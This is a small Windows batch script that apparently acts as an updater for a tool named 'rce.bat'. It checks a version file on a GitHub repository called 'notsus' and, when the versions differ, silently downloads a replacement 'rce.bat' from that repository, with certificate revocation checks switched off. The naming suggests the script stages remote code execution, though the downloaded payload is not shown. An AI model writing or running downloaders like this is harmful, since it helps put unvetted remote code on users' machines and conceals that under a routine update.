@echo off
set version=0.2

curl -o ver.dat -s --ssl-no-revoke https://raw.githubusercontent.com/NajdzrBalls/notsus/main/P/version.txt
set /p latest_version=<ver.dat
del ver.dat

if %version%==%latest_version% (
	echo We are on latest version. No need to update
) else (
	echo We aren't on latest version Updating...
	curl -o rce1.bat -s --ssl-no-revoke https://raw.githubusercontent.com/NajdzrBalls/notsus/main/P/rce.bat
    	move rce1.bat rce.bat
	echo Sucessfully updated!
)

pause
